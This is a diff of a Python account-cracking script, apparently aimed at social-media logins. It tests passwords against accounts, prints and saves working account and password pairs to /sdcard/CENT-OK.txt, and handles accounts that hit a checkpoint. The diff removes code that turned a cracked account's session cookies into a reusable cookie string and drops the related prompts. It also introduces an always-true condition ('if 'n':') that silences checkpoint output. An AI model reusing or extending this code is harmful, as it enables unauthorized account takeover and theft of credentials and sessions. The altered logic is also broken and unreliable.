@@ -297,10 +297,6 @@ def method():
     print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
     m=input(f"{oo('!')}Input : ") 
     print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
-    cpok=input(f"{oo('!')}Input : ")
-    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
-    c=input(f"{oo('!')}Input : ")
-    apps='y'
     os.system("clear")
     print(logo) 
     print('\033[1;93m='*25)
@@ -336,17 +332,10 @@ def method():
                 okacc.append(acc)
                 print('\r\033[1;92m[\033[1;97mCENT-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                 open('/sdcard/CENT-OK.txt','a').write(f'{acc} • {pword}\n')
-                if c=='y':
-                 try:  
-                  q = json.loads(response.text)
-                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-                  cookies = f"sb={ssbb};{ckkk}"
-                 except Exception as e:print(str(e)+' | '+response.text)
-                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
-                 break
+                            
+                 
             elif 'checkpoint' in response.text:
-                if cpok=='n':
+                if 'n':
                      pass
                 else:
                      print('\r\033[1;91m[\033[1;97mCENT-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
